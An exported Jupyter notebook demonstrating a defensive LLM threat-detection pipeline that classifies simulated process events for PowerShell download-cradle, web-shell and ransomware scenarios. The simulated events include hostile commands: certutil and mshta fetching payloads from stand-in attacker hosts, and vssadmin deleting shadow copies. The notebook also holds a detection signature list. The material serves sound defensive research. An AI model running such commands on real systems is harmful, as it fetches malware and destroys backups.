# cyber-sense · demo notebook

Companion to **"The Ignition Problem"** by Andrew Hinton.

The central argument: *initiation autonomy is a property of the sensing layer,
not the agent.* The same five-node LangGraph pipeline runs in both modes below.
What differs is what fires it.

| Mode | Sensing layer | Human involvement in detection |
|---|---|---|
| **Category 3** — rule-based | `TRIGGER_SIGNATURES` list → `is_trigger()` → Haiku triage | Human wrote the rules |
| **Category 4** — orchestrator | `OrchestratorSession` reasons from general knowledge | None |

**Architecture**
```
[Layer 1]  sensor/monitor.py + sensor/orchestrator.py   ← ignition layer
[Layer 2]  agent/graph.py  (LangGraph 5-node pipeline)  ← orchestration
[Layer 3]  agent/agent.py  (ReAct agent + 4 tools)      ← reasoning
[Layer 4]  memory/store.py (ChromaDB + JSON history)    ← persistence
```

**Sections**
1. Setup
2. Scenarios — the raw event data
3. Category 3 — rule-based sensor (dry-run, no LLM)
4. Category 4 — adaptive orchestrator (Haiku calls)
5. Pipeline step-by-step (Sonnet calls)
6. Agent tools & memory
7. Full run — rules mode
8. Full run — orchestrator mode  
9. Side-by-side comparison

---
## 1. Setup

In [1]:
import os, sys, json, time
from pathlib import Path
from datetime import datetime, timedelta

# Locate project root whether running from notebooks/ or project root
vsc_path = globals().get('__vsc_ipynb_file__', '')
notebook_dir = Path(vsc_path).parent if vsc_path else Path.cwd()
project_root = notebook_dir.parent if notebook_dir.name == 'notebooks' else notebook_dir

# Add src/ first (editable install fallback), then project root
for p in [str(project_root / 'src'), str(project_root)]:
    if p not in sys.path:
        sys.path.insert(0, p)

os.chdir(project_root)
print(f"Project root : {project_root}")
print(f"Python       : {sys.version.split()[0]}")

Project root : /Users/andrewhinton/Documents/Autonoum_Agent_Demo/cyber-sense
Python       : 3.13.11


In [2]:
from dotenv import load_dotenv
load_dotenv()

key = os.getenv("ANTHROPIC_API_KEY", "")
if key:
    print(f"✓  ANTHROPIC_API_KEY loaded  ({key[:12]}...)")
else:
    print("✗  ANTHROPIC_API_KEY not found — set it in .env or uncomment below")
    # os.environ["ANTHROPIC_API_KEY"] = "sk-ant-..."

✓  ANTHROPIC_API_KEY loaded  (sk-ant-api03...)


---
## 2. Scenarios — the raw event data

Each scenario is a list of process event dicts. The sensor sees these one at a time,
exactly as it would see real psutil snapshots. The event format is identical for both
simulated and real monitoring.

In [3]:
from cyber_sense.simulation.malicious import get_scenario_a, get_scenario_b, get_scenario_c
from cyber_sense.simulation.normal import get_normal_scenario

events_a, name_a = get_scenario_a()   # PowerShell download cradle
events_b, name_b = get_scenario_b()   # Web shell activity
events_c, name_c = get_scenario_c()   # Ransomware staging
events_n, name_n = get_normal_scenario()  # Benign baseline

for events, name in [(events_a, name_a), (events_b, name_b),
                     (events_c, name_c), (events_n, name_n)]:
    print(f"  {name:<40} {len(events)} events")

  PowerShell Download Cradle               5 events
  Web Shell Activity                       5 events
  Ransomware Staging                       6 events
  Normal User Activity (Baseline)          7 events


In [4]:
# Inspect the event format — every field the sensor and pipeline see
print(json.dumps(events_a[2], indent=2))  # the powershell.exe trigger event

{
  "timestamp": "07:21:29",
  "pid": 6789,
  "name": "powershell.exe",
  "parent_pid": 5432,
  "parent_name": "cmd.exe",
  "cmdline": "powershell.exe -EncodedCommand JABjACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQA...",
  "action": "process_start"
}


In [5]:
# Print a human-readable process tree for each scenario
def show_tree(events, name):
    print(f"── {name}")
    for e in events:
        ts   = e.get("timestamp", "?")
        act  = e.get("action", "process_start")
        det  = e.get("detail", "")
        par  = e.get("parent_name") or "—"
        pid  = e.get("pid", "?")
        nm   = e.get("name", "?")
        cmd  = e.get("cmdline", "")
        if act == "process_start":
            print(f"   [{ts}] {nm} (pid {pid})  ←  {par}")
            if cmd and cmd != nm:
                print(f"            {cmd[:80]}")
        else:
            print(f"   [{ts}] {nm}  —  {det}")
    print()

for events, name in [(events_a, name_a), (events_b, name_b),
                     (events_c, name_c), (events_n, name_n)]:
    show_tree(events, name)

── PowerShell Download Cradle
   [07:21:27] explorer.exe (pid 1234)  ←  —
   [07:21:28] cmd.exe (pid 5432)  ←  explorer.exe
            cmd.exe /c
   [07:21:29] powershell.exe (pid 6789)  ←  cmd.exe
            powershell.exe -EncodedCommand JABjACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQA...
   [07:21:31] certutil.exe (pid 7890)  ←  powershell.exe
            certutil.exe -urlcache -f http://malicious.example.com/payload.exe C:\Users\Publ
   [07:21:33] certutil.exe  —  Outbound TCP connection to 203.0.113.99:80 (malicious.example.com)

── Web Shell Activity
   [07:21:27] w3wp.exe (pid 5678)  ←  svchost.exe
            c:\windows\system32\inetsrv\w3wp.exe -ap DefaultAppPool
   [07:21:28] cmd.exe (pid 6543)  ←  w3wp.exe
            cmd.exe /c whoami
   [07:21:30] cmd.exe (pid 6544)  ←  w3wp.exe
            cmd.exe /c net user
   [07:21:32] cmd.exe (pid 6545)  ←  w3wp.exe
            cmd.exe /c ipconfig /all
   [07:21:34] cmd.exe (pid 6546)  ←  w3wp.exe
            cmd.exe /c net group "Domain A

---
## 3. Category 3 — Rule-based sensor (dry-run, no LLM)

`is_trigger()` checks each process snapshot against `TRIGGER_SIGNATURES`.
This is pure Python — no model is called. A human authored every rule in the list.

The trigger check is the first gate in the two-step `watch_simulated()` path:
```
is_trigger(snapshot) → True
    → triage_with_llm(snapshot, context)  [Haiku, cost gate]
        → on_trigger callback             [fires the full pipeline]
```
This cell shows only the rule-matching gate. No API calls.

In [6]:
from cyber_sense.sensor.monitor import is_trigger, TRIGGER_SIGNATURES

print(f"{len(TRIGGER_SIGNATURES)} active signatures:\n")
for sig in TRIGGER_SIGNATURES:
    parts = [f"{k}={v!r}" for k, v in sig.items()]
    print(f"  {'  AND  '.join(parts)}")

6 active signatures:

  process='powershell.exe'  AND  cmdline_contains='-EncodedCommand'
  process='powershell.exe'  AND  cmdline_contains=' -enc '
  parent='w3wp.exe'  AND  process='cmd.exe'
  parent='w3wp.exe'  AND  process='powershell.exe'
  parent='httpd.exe'  AND  process='cmd.exe'
  process='vssadmin.exe'  AND  cmdline_contains='delete shadows'


In [7]:
# Feed each scenario through is_trigger() — observe which events match
def sensor_dry_run(events, name):
    print(f"── {name}")
    fired = False
    for e in events:
        snap = {
            "pid":         e["pid"],
            "name":        e["name"],
            "parent_pid":  e.get("parent_pid"),
            "parent_name": e.get("parent_name"),
            "cmdline":     e.get("cmdline", ""),
        }
        hit = is_trigger(snap)
        tag = "  ◀ TRIGGER" if hit else ""
        ts  = e.get("timestamp", "?")
        act = e.get("action", "process_start")
        par = e.get("parent_name") or "—"
        if act == "process_start":
            print(f"   [{ts}] {e['name']} (pid {e['pid']})  ←  {par}{tag}")
        else:
            print(f"   [{ts}] {e['name']}  —  {e.get('detail', act)}{tag}")
        if hit and not fired:
            fired = True
    if not fired:
        print("   → no trigger matched")
    print()

for events, name in [(events_a, name_a), (events_b, name_b),
                     (events_c, name_c), (events_n, name_n)]:
    sensor_dry_run(events, name)

── PowerShell Download Cradle
   [07:21:27] explorer.exe (pid 1234)  ←  —
   [07:21:28] cmd.exe (pid 5432)  ←  explorer.exe
   [07:21:29] powershell.exe (pid 6789)  ←  cmd.exe  ◀ TRIGGER
   [07:21:31] certutil.exe (pid 7890)  ←  powershell.exe
   [07:21:33] certutil.exe  —  Outbound TCP connection to 203.0.113.99:80 (malicious.example.com)

── Web Shell Activity
   [07:21:27] w3wp.exe (pid 5678)  ←  svchost.exe
   [07:21:28] cmd.exe (pid 6543)  ←  w3wp.exe  ◀ TRIGGER
   [07:21:30] cmd.exe (pid 6544)  ←  w3wp.exe  ◀ TRIGGER
   [07:21:32] cmd.exe (pid 6545)  ←  w3wp.exe  ◀ TRIGGER
   [07:21:34] cmd.exe (pid 6546)  ←  w3wp.exe  ◀ TRIGGER

── Ransomware Staging
   [07:21:27] update.exe (pid 8888)  ←  —
   [07:21:28] vssadmin.exe (pid 9001)  ←  update.exe  ◀ TRIGGER
   [07:21:30] update.exe  —  Mass rename: Desktop\*.* → Desktop\*.locked (47 files)
   [07:21:31] update.exe  —  Mass rename: Documents\*.* → Documents\*.locked (213 files)
   [07:21:32] update.exe  —  Mass rename: Downloads\*.*

### Adding a rule at runtime (the Category 3 extension pattern)

A human writes a new rule, re-runs the sensor. This is how Category 3 adapts:
not by reasoning, but by rule authorship.

In [8]:
from cyber_sense.sensor import monitor as mon

# Scenario: outlook.exe spawning mshta.exe — not in the default signatures
mshta_events = [
    {"timestamp": "10:00:00", "pid": 2000, "name": "outlook.exe",
     "parent_pid": None, "parent_name": None, "cmdline": "outlook.exe", "action": "process_start"},
    {"timestamp": "10:00:02", "pid": 2100, "name": "mshta.exe",
     "parent_pid": 2000, "parent_name": "outlook.exe",
     "cmdline": "mshta.exe http://attacker.example.com/payload.hta", "action": "process_start"},
]

print("Before adding rule:")
sensor_dry_run(mshta_events, "MSHTA from Outlook")

# Human adds the rule
mon.TRIGGER_SIGNATURES.append({"parent": "outlook.exe", "process": "mshta.exe"})
print(f"Rule added. Signatures now: {len(mon.TRIGGER_SIGNATURES)}")
print()

print("After adding rule:")
sensor_dry_run(mshta_events, "MSHTA from Outlook")

Before adding rule:
── MSHTA from Outlook
   [10:00:00] outlook.exe (pid 2000)  ←  —
   [10:00:02] mshta.exe (pid 2100)  ←  outlook.exe
   → no trigger matched

Rule added. Signatures now: 7

After adding rule:
── MSHTA from Outlook
   [10:00:00] outlook.exe (pid 2000)  ←  —
   [10:00:02] mshta.exe (pid 2100)  ←  outlook.exe  ◀ TRIGGER



---
## 4. Category 4 — Adaptive orchestrator (Haiku calls)

`OrchestratorSession` feeds process events to `claude-haiku-4-5` with no pre-specified rules.
The model reasons from general security knowledge and decides:
- **INVESTIGATE** — fire the analysis pipeline
- **CONTINUE** — keep watching; self-selects the next check interval (3–20 events)

> **LLM calls:** each `add_event()` call that hits the check interval makes one Haiku call.
> Each cell below makes 2–5 Haiku calls.

This is the key architectural difference from Category 3: *no human authored what counts as suspicious.*

In [9]:
from cyber_sense.sensor.orchestrator import OrchestratorSession

def orchestrator_dry_run(events, name):
    """Feed events into an OrchestratorSession and print every decision."""
    print(f"── {name}  (no pre-specified rules)")
    session = OrchestratorSession(name)

    for e in events:
        ts  = e.get("timestamp", "?")
        act = e.get("action", "process_start")
        det = e.get("detail", "")
        par = e.get("parent_name") or "—"
        if act == "process_start":
            print(f"   [{ts}] {e['name']} (pid {e['pid']})  ←  {par}")
        else:
            print(f"   [{ts}] {e['name']}  —  {det}")

        decision, reasoning = session.add_event(e)

        if decision is None:
            continue   # not yet at check interval
        if decision:   # INVESTIGATE
            print(f"\n   [orchestrator] *** INVESTIGATE ***")
            print(f"   [orchestrator] {reasoning}")
            print(f"   [orchestrator] — pipeline would fire here —\n")
            return True
        else:          # CONTINUE
            print(f"\n   [orchestrator] CONTINUE  (next check in {session.next_check_events} events)")
            print(f"   [orchestrator] {reasoning}\n")

    # End of feed — force a final evaluation
    decision, reasoning = session.evaluate_now()
    label = "INVESTIGATE (final)" if decision else "CONTINUE (final — no investigation)"
    print(f"\n   [orchestrator] {label}")
    print(f"   [orchestrator] {reasoning}")
    print()
    return decision

# Scenario A: PowerShell cradle — expect INVESTIGATE
orchestrator_dry_run(events_a, name_a)

── PowerShell Download Cradle  (no pre-specified rules)
   [07:21:27] explorer.exe (pid 1234)  ←  —
   [07:21:28] cmd.exe (pid 5432)  ←  explorer.exe
   [07:21:29] powershell.exe (pid 6789)  ←  cmd.exe
   [07:21:31] certutil.exe (pid 7890)  ←  powershell.exe
   [07:21:33] certutil.exe  —  Outbound TCP connection to 203.0.113.99:80 (malicious.example.com)

   [orchestrator] *** INVESTIGATE ***
   [orchestrator] This chain exhibits multiple high-confidence attack indicators including: (1) explorer.exe spawning cmd.exe, which is unusual and commonly used for process injection/living-off-the-land attacks; (2) cmd.exe launching powershell.exe with encoded commands, a classic obfuscation technique; (3) powershell.exe executing certutil.exe to download a remote executable to a world-writable directory, matching known malware delivery patterns; (4) duplicate certutil command suggesting potential retry logic or automated attack tooling. The complete kill chain from GUI process → shell → script 

True

In [10]:
# Run all four scenarios — expect A/B/C → INVESTIGATE, N → CONTINUE
print("=" * 60)
for evts, nm in [(events_b, name_b), (events_c, name_c), (events_n, name_n)]:
    orchestrator_dry_run(evts, nm)
    print("=" * 60)

── Web Shell Activity  (no pre-specified rules)
   [07:21:27] w3wp.exe (pid 5678)  ←  svchost.exe
   [07:21:28] cmd.exe (pid 6543)  ←  w3wp.exe
   [07:21:30] cmd.exe (pid 6544)  ←  w3wp.exe
   [07:21:32] cmd.exe (pid 6545)  ←  w3wp.exe
   [07:21:34] cmd.exe (pid 6546)  ←  w3wp.exe

   [orchestrator] *** INVESTIGATE ***
   [orchestrator] w3wp.exe (IIS application pool process) spawning multiple cmd.exe instances in rapid succession to execute reconnaissance commands (whoami, net user, ipconfig, net group Domain Admins) is a classic post-exploitation behavior pattern. IIS processes should not be executing system discovery commands; this indicates either a compromised web application or web server exploitation. The escalating nature of queries (identity → local users → network config → domain admin enumeration) suggests active reconnaissance by an attacker with code execution capability.
   [orchestrator] — pipeline would fire here —

── Ransomware Staging  (no pre-specified rules)
   [07

### Category 3 vs Category 4 on the mshta scenario

Category 3 was silent until a human added a rule.
The orchestrator catches the same technique from general knowledge — no rule needed.

In [11]:
print("Category 3 (after rule was added above):")
sensor_dry_run(mshta_events, "MSHTA from Outlook")

print("Category 4 (original signatures, no rule added):")
# Reset to original signatures so this is a fair comparison
original_sigs = [s for s in mon.TRIGGER_SIGNATURES if not (s.get("parent") == "outlook.exe")]
mon.TRIGGER_SIGNATURES[:] = original_sigs

orchestrator_dry_run(mshta_events, "MSHTA from Outlook")

Category 3 (after rule was added above):
── MSHTA from Outlook
   [10:00:00] outlook.exe (pid 2000)  ←  —
   [10:00:02] mshta.exe (pid 2100)  ←  outlook.exe  ◀ TRIGGER

Category 4 (original signatures, no rule added):
── MSHTA from Outlook  (no pre-specified rules)
   [10:00:00] outlook.exe (pid 2000)  ←  —
   [10:00:02] mshta.exe (pid 2100)  ←  outlook.exe

   [orchestrator] INVESTIGATE (final)
   [orchestrator] Outlook spawning mshta.exe to execute a remote HTA file from an external domain is a classic email-based attack chain. This pattern indicates potential code execution via malicious email attachment or link, requiring immediate analysis of the HTA payload, email source, and network indicators. Mshta execution with remote content is particularly high-risk as it can bypass application whitelisting and execute arbitrary scripts.



True

---
## 5. Pipeline step-by-step (Sonnet calls)

The LangGraph pipeline has five nodes in a fixed linear chain:
```
trigger_received → monitor_activity → analyze_sequence → classify_threat → generate_report
```

Each node is a plain Python function: `node(state: ThreatState) → ThreatState`.
Run them one at a time to inspect state after each step.

> **LLM calls:** nodes 3 and 4 each call `claude-sonnet-4-6`. Expect 60–120s total.

In [12]:
from cyber_sense.agent.graph import (
    trigger_received, monitor_activity,
    analyze_sequence, classify_threat, generate_report,
    ThreatState,
)

# Build the trigger snapshot — the event that fired the sensor
STEP_EVENTS = events_a
STEP_NAME   = name_a
STEP_SESSION = datetime.now().strftime("%Y%m%d_%H%M%S") + "_step"

# Use the first is_trigger() match as the trigger snapshot
from cyber_sense.sensor.monitor import is_trigger
step_trigger = None
for e in STEP_EVENTS:
    snap = {"pid": e["pid"], "name": e["name"],
            "parent_pid": e.get("parent_pid"), "parent_name": e.get("parent_name"),
            "cmdline": e.get("cmdline", "")}
    if is_trigger(snap):
        step_trigger = snap
        break

if step_trigger is None:          # normal scenario fallback
    e0 = STEP_EVENTS[0]
    step_trigger = {"pid": e0["pid"], "name": e0["name"],
                    "parent_pid": e0.get("parent_pid"), "parent_name": e0.get("parent_name"),
                    "cmdline": e0.get("cmdline", "")}

# Initial state — all analysis fields empty
state: ThreatState = {
    "scenario_name":          STEP_NAME,
    "session_id":             STEP_SESSION,
    "trigger":                step_trigger,
    "process_events":         STEP_EVENTS,
    "process_sequence":       "",
    "analysis":               "",
    "classification":         {},
    "report":                 "",
    "orchestrator_reasoning": "",
}

print(f"Scenario  : {STEP_NAME}")
print(f"Trigger   : {step_trigger['name']} (pid {step_trigger['pid']}) ← {step_trigger.get('parent_name')}")
print(f"Session   : {STEP_SESSION}")
print(f"Events    : {len(STEP_EVENTS)}")

Scenario  : PowerShell Download Cradle
Trigger   : powershell.exe (pid 6789) ← cmd.exe
Session   : 20260526_072148_step
Events    : 5


In [13]:
# Node 1: trigger_received — logs the event, passes state through unchanged
state = trigger_received(state)
print("After trigger_received: state unchanged (logging only)")

  [1/5] trigger_received  — powershell.exe (pid 6789) <- cmd.exe
After trigger_received: state unchanged (logging only)


In [14]:
# Node 2: monitor_activity — formats the event list into process_sequence string
state = monitor_activity(state)
print("process_sequence:\n")
print(state["process_sequence"])

  [2/5] monitor_activity  — 5 events collected
process_sequence:

[07:21:27] explorer.exe (pid 1234) spawned by — (pid —)
[07:21:28] cmd.exe (pid 5432) spawned by explorer.exe (pid 1234)
           cmdline: cmd.exe /c
[07:21:29] powershell.exe (pid 6789) spawned by cmd.exe (pid 5432)
           cmdline: powershell.exe -EncodedCommand JABjACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQA...
[07:21:31] certutil.exe (pid 7890) spawned by powershell.exe (pid 6789)
           cmdline: certutil.exe -urlcache -f http://malicious.example.com/payload.exe C:\Users\Public\payload.exe
[07:21:33] certutil.exe (pid 7890) — Outbound TCP connection to 203.0.113.99:80 (malicious.example.com)


In [15]:
# Node 3: analyze_sequence — ReAct agent (Sonnet) with 4 tools
# The agent calls format_process_tree, identify_attack_patterns,
# lookup_mitre_technique, get_similar_threats, then synthesises an analysis.
state = analyze_sequence(state)
print("analysis (first 1000 chars):\n")
print(state["analysis"][:1000])

  [3/5] analyze_sequence  — invoking ReAct agent...
  [Anthropic API call] model=claude-sonnet-4-6  messages=2  ts=07:21:48
  [Anthropic API call] model=claude-sonnet-4-6  messages=6  ts=07:21:57
  [Anthropic API call] model=claude-sonnet-4-6  messages=10  ts=07:22:01
analysis (first 1000 chars):

All data collected. Here is the complete threat analysis.

---

# 🔴 THREAT ANALYSIS REPORT — CRITICAL SEVERITY

---

## 1. Attack Pattern Match: **PowerShell Download Cradle**

This sequence is a **textbook, high-confidence PowerShell Download Cradle**. Every structural indicator from the reference pattern is present and confirmed:

| Reference Indicator | Observed Behavior | Match |
|---|---|---|
| Explorer/Office app spawns `cmd.exe` | `explorer.exe (1234)` → `cmd.exe (5432)` | ✅ |
| `cmd.exe` spawns `powershell.exe` | `cmd.exe (5432)` → `powershell.exe (6789)` | ✅ |
| PowerShell uses `-EncodedCommand` | `powershell.exe -EncodedCommand JABjACA...` | ✅ |
| PowerShell child runs `certutil.exe

In [16]:
# Node 4: classify_threat — structured JSON verdict (Sonnet)
state = classify_threat(state)
print("classification:\n")
print(json.dumps(state["classification"], indent=2))

  [4/5] classify_threat   — calling LLM...
  [Anthropic API call] model=claude-sonnet-4-6  node=classify_threat  ts=07:22:48
classification:

{
  "threat_level": "CRITICAL",
  "confidence": 0.93,
  "techniques": [
    "T1059.001 - Command and Scripting Interpreter: PowerShell",
    "T1027 - Obfuscated Files or Information",
    "T1105 - Ingress Tool Transfer",
    "T1218 - System Binary Proxy Execution",
    "T1204.002 - User Execution: Malicious File",
    "T1071.001 - Application Layer Protocol: Web Protocols"
  ],
  "reasoning": "A confirmed, fully-matched PowerShell Download Cradle (explorer.exe \u2192 cmd.exe \u2192 powershell.exe -EncodedCommand \u2192 certutil.exe -urlcache) executed within 6 seconds, staging a remote binary from an adversary-controlled host to C:\\Users\\Public\\payload.exe; combined with three prior CRITICAL-severity detections on the same host, this represents an active multi-stage intrusion in progress.",
  "recommended_actions": [
    "ISOLATE the affected 

In [17]:
# Node 5: generate_report — assembles the final formatted report
# Also saves to ChromaDB and JSON threat history if threat_level != BENIGN
state = generate_report(state)
print(state["report"])

  [5/5] generate_report   — formatting output
CYBER-SENSE THREAT REPORT
Timestamp: 2026-05-26 07:22:57
Trigger:   powershell.exe spawned from cmd.exe

Initiated by: environment signal (process monitor)
Human involvement: none at detection or analysis stage

PROCESS SEQUENCE
----------------
[07:21:27] explorer.exe (pid 1234) spawned by — (pid —)
[07:21:28] cmd.exe (pid 5432) spawned by explorer.exe (pid 1234)
           cmdline: cmd.exe /c
[07:21:29] powershell.exe (pid 6789) spawned by cmd.exe (pid 5432)
           cmdline: powershell.exe -EncodedCommand JABjACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQA...
[07:21:31] certutil.exe (pid 7890) spawned by powershell.exe (pid 6789)
           cmdline: certutil.exe -urlcache -f http://malicious.example.com/payload.exe C:\Users\Public\payload.exe
[07:21:33] certutil.exe (pid 7890) — Outbound TCP connection to 203.0.113.99:80 (malicious.example.com)

THREAT CLASSIFICATION
---------------------
Level:      CRITICAL
Confidence: 0.93
Technique:  T1059.00

---
## 6. Agent tools & memory

The ReAct agent in `analyze_sequence` has four tools. You can call them directly
as Python functions without going through the full agent loop.

In [18]:
from cyber_sense.agent.tools import (
    format_process_tree,
    identify_attack_patterns,
    lookup_mitre_technique,
    get_similar_threats,
    format_process_sequence,
)

# All four are @tool-decorated LangChain tools
from cyber_sense.agent.agent import AGENT_TOOLS
print("Agent tools:")
for t in AGENT_TOOLS:
    print(f"  {t.name:<30} {t.description[:70]}")

Agent tools:
  format_process_tree            Parse a JSON list of process events and return a readable process tree
  identify_attack_patterns       Match a process execution sequence against known attack patterns.
Retu
  lookup_mitre_technique         Return name, tactic, and description for a MITRE ATT&CK technique ID (
  get_similar_threats            Search persistent threat history for past detections semantically simi


In [19]:
# Tool 1: format_process_tree — converts raw event JSON to a readable tree
raw = json.dumps(events_b)          # Web shell events as JSON string
tree = format_process_tree.invoke(raw)
print(tree)

[07:21:27] w3wp.exe (pid 5678) spawned by svchost.exe (pid 4567)
           cmdline: c:\windows\system32\inetsrv\w3wp.exe -ap DefaultAppPool
[07:21:28] cmd.exe (pid 6543) spawned by w3wp.exe (pid 5678)
           cmdline: cmd.exe /c whoami
[07:21:30] cmd.exe (pid 6544) spawned by w3wp.exe (pid 5678)
           cmdline: cmd.exe /c net user
[07:21:32] cmd.exe (pid 6545) spawned by w3wp.exe (pid 5678)
           cmdline: cmd.exe /c ipconfig /all
[07:21:34] cmd.exe (pid 6546) spawned by w3wp.exe (pid 5678)
           cmdline: cmd.exe /c net group "Domain Admins" /domain


In [20]:
# Tool 2: identify_attack_patterns — pure regex/string matching, no LLM
seq = format_process_sequence(events_b)    # use the plain helper (not @tool)
result = identify_attack_patterns.invoke(seq)
print(result)

Web Shell Execution — Techniques: T1505.003, T1033, T1087, T1016


In [21]:
# Tool 3: lookup_mitre_technique — local lookup table, no LLM
for tid in ["T1505.003", "T1059.001", "T1490", "T1486"]:
    print(lookup_mitre_technique.invoke(tid))
    print()

ID: T1505.003
Name: Server Software Component: Web Shell
Tactic: Persistence
Description: Web worker (w3wp.exe, httpd.exe) spawning interactive shells is the primary indicator.

ID: T1059.001
Name: Command and Scripting Interpreter: PowerShell
Tactic: Execution
Description: Abused via -EncodedCommand, -enc, -ep Bypass, -nop, -w hidden to evade logging.

ID: T1490
Name: Inhibit System Recovery
Tactic: Impact
Description: 'vssadmin delete shadows /all /quiet' destroys backups before ransomware.

ID: T1486
Name: Data Encrypted for Impact
Tactic: Impact
Description: Mass renames to .locked/.encrypted; ransom notes (README_DECRYPT.txt).



In [22]:
# Tool 4: get_similar_threats — semantic search over ChromaDB threat history
# (will be empty until you run a full scenario that saves a threat record)
result = get_similar_threats.invoke("powershell encoded command certutil download")
print(result)

Found 3 similar past detection(s):

  [2026-05-26T07:22:57] CRITICAL (conf 0.93) — PowerShell Download Cradle
  Techniques: T1059.001 - Command and Scripting Interpreter: PowerShell, T1027 - Obfuscated Files or Information, T1105 - Ingress Tool Transfer

  [2026-05-25T09:32:19] CRITICAL (conf 0.95) — Web Shell Activity
  Techniques: T1505.003 - Server Software Component: Web Shell, T1033 - System Owner/User Discovery, T1087 - Account Discovery

  [2026-05-25T09:33:43] CRITICAL (conf 0.95) — Web Shell Activity
  Techniques: T1505.003 - Server Software Component: Web Shell, T1033 - System Owner/User Discovery, T1087 - Account Discovery


### Memory — ChromaDB + JSON threat history

In [23]:
from cyber_sense.memory.store import search_similar_threats, _load_json

history = _load_json()
print(f"Threat history: {len(history)} records")
if history:
    print()
    for r in history[-5:]:
        conf = r.get('confidence', 0)
        print(f"  [{r['timestamp'][:19]}]  {r['threat_level']:<8}  conf={conf:.2f}  {r['scenario']}")

Threat history: 4 records

  [2026-05-25T09:07:42]  LOW       conf=0.92  Normal User Activity (Baseline)
  [2026-05-25T09:32:19]  CRITICAL  conf=0.95  Web Shell Activity
  [2026-05-25T09:33:43]  CRITICAL  conf=0.95  Web Shell Activity
  [2026-05-26T07:22:57]  CRITICAL  conf=0.93  PowerShell Download Cradle


In [24]:
# Semantic similarity search across all past threat records
# Useful for: "have we seen this technique before?"
results = search_similar_threats("web shell reconnaissance whoami net user", n_results=3)
if results:
    for r in results:
        print(f"  {r['threat_level']}  {r['scenario']}  ({r['timestamp'][:19]})")
        print(f"  distance={r['distance']:.3f}  techniques: {', '.join(r['techniques'][:2])}")
        print()
else:
    print("No records yet — run section 7 or 8 first to populate threat history.")

  CRITICAL  Web Shell Activity  (2026-05-25T09:32:19)
  distance=0.891  techniques: T1505.003 - Server Software Component: Web Shell, T1033 - System Owner/User Discovery

  CRITICAL  Web Shell Activity  (2026-05-25T09:33:43)
  distance=1.028  techniques: T1505.003 - Server Software Component: Web Shell, T1033 - System Owner/User Discovery

  CRITICAL  PowerShell Download Cradle  (2026-05-26T07:22:57)
  distance=1.347  techniques: T1059.001 - Command and Scripting Interpreter: PowerShell, T1027 - Obfuscated Files or Information



---
## 7. Full run — rules mode (Category 3)

`watch_simulated()` feeds events through `is_trigger()` → `triage_with_llm()` → `run_scenario()`.

The report footer will read:
```
Initiated by: environment signal (process monitor)
Human involvement: none at detection or analysis stage
```

> **LLM calls:** 1 Haiku (triage) + 3-4 Sonnet (pipeline). Expect 2–4 minutes.

In [25]:
from cyber_sense.sensor.monitor import watch_simulated
from cyber_sense.agent.graph import run_scenario

# ── choose scenario ─────────────────────────────────────────────────────────
RULES_EVENTS = events_c       # try events_a / events_b / events_c / events_n
RULES_NAME   = name_c
# ────────────────────────────────────────────────────────────────────────────

RULES_SESSION = datetime.now().strftime("%Y%m%d_%H%M%S") + "_rules"
rules_report  = None

def on_rules_trigger(snapshot: dict, all_events: list):
    global rules_report
    rules_report = run_scenario(
        RULES_NAME, snapshot, all_events,
        session_id=RULES_SESSION,
    )

print(f"Running {RULES_NAME} in rules mode...")
fired = watch_simulated(RULES_NAME, RULES_EVENTS, on_rules_trigger, delay=0.0)

if not fired:
    # Normal scenario: no signature matched — run pipeline directly for comparison
    e0 = RULES_EVENTS[0]
    trigger = {"pid": e0["pid"], "name": e0["name"],
               "parent_pid": e0.get("parent_pid"), "parent_name": e0.get("parent_name"),
               "cmdline": e0.get("cmdline", "")}
    rules_report = run_scenario(RULES_NAME, trigger, RULES_EVENTS, session_id=RULES_SESSION)

Running Ransomware Staging in rules mode...
[sensor] Simulated feed: Ransomware Staging
[sensor] Watching 6 events...

  [07:21:27] update.exe (pid 8888)  ←  —
  [07:21:28] vssadmin.exe (pid 9001)  ←  update.exe

[sensor] *** TRIGGER: vssadmin.exe (pid 9001) matched a signature ***
[sensor] Running LLM triage...
[sensor] [TRIAGE] FIRE — This exhibits classic ransomware behavior: shadow copy deletion via vssadmin for destruction of recovery points, spawned from a suspicious update.exe in temp folder, followed by ransom note creation.
[sensor] Environment signal confirmed — initiating pipeline...

  [1/5] trigger_received  — vssadmin.exe (pid 9001) <- update.exe
  [2/5] monitor_activity  — 6 events collected
  [3/5] analyze_sequence  — invoking ReAct agent...
  [Anthropic API call] model=claude-sonnet-4-6  messages=2  ts=07:22:59
  [Anthropic API call] model=claude-sonnet-4-6  messages=6  ts=07:23:09
  [Anthropic API call] model=claude-sonnet-4-6  messages=9  ts=07:23:12
  [4/5] classify

In [26]:
print(rules_report)

CYBER-SENSE THREAT REPORT
Timestamp: 2026-05-26 07:24:16
Trigger:   vssadmin.exe spawned from update.exe

Initiated by: environment signal (process monitor)
Human involvement: none at detection or analysis stage

PROCESS SEQUENCE
----------------
[07:21:27] update.exe (pid 8888) spawned by — (pid —)
           cmdline: C:\Users\Public\AppData\Local\Temp\update.exe
           note:    Unsigned binary — path: C:\Users\Public\AppData\Local\Temp\update.exe
[07:21:28] vssadmin.exe (pid 9001) spawned by update.exe (pid 8888)
           cmdline: vssadmin.exe delete shadows /all /quiet
[07:21:30] update.exe (pid 8888) — Mass rename: Desktop\*.* → Desktop\*.locked (47 files)
[07:21:31] update.exe (pid 8888) — Mass rename: Documents\*.* → Documents\*.locked (213 files)
[07:21:32] update.exe (pid 8888) — Mass rename: Downloads\*.* → Downloads\*.locked (89 files)
[07:21:33] notepad.exe (pid 9002) spawned by update.exe (pid 8888)
           cmdline: notepad.exe C:\Users\Public\Desktop\README_DECRYP

---
## 8. Full run — orchestrator mode (Category 4)

`watch_with_orchestrator()` replaces the `TRIGGER_SIGNATURES` check with an
`OrchestratorSession`. The model decides when to investigate and why.

The report footer will read:
```
ORCHESTRATOR DECISION
---------------------
Decision:   INVESTIGATE
Reasoning:  <orchestrator's 2-4 sentence reasoning>

Initiated by: autonomous orchestrator reasoning (no pre-specified rules)
Human involvement: none at initiation, analysis, or detection stage
```

> **LLM calls:** 2-4 Haiku (orchestrator) + 3-4 Sonnet (pipeline). Expect 2–4 minutes.

In [27]:
from cyber_sense.sensor.monitor import watch_with_orchestrator

# ── choose scenario ─────────────────────────────────────────────────────────
ORCH_EVENTS = events_b        # try events_a / events_b / events_c / events_n
